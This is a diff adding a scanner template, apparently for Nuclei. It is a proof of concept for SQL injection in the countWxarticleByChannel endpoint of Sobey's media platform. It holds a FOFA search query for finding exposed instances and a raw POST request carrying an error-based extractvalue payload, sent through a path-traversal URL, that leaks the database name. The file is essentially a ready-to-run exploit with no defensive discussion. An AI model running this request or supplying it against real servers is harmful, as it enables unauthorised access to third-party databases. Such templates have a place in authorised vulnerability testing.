@@ -1,0 +1,38 @@
+id: poc-lt97p39rpg8h9ak9
+info:
+  name: 索贝融媒体countWxarticleByChannel存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lt97p39rpg8h9ak9'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lt97p39rpg8h9ak9
+    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
+http:
+- raw:
+  - 'POST /sobey-mchEditor/mch/statistics/js/../countWxarticleByChannel HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: max-age=0
+
+
+    createUserCode=1''+and+extractvalue(1,concat(0x7e,database()))+and ''1''=''1-+-&token=1&siteCode=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
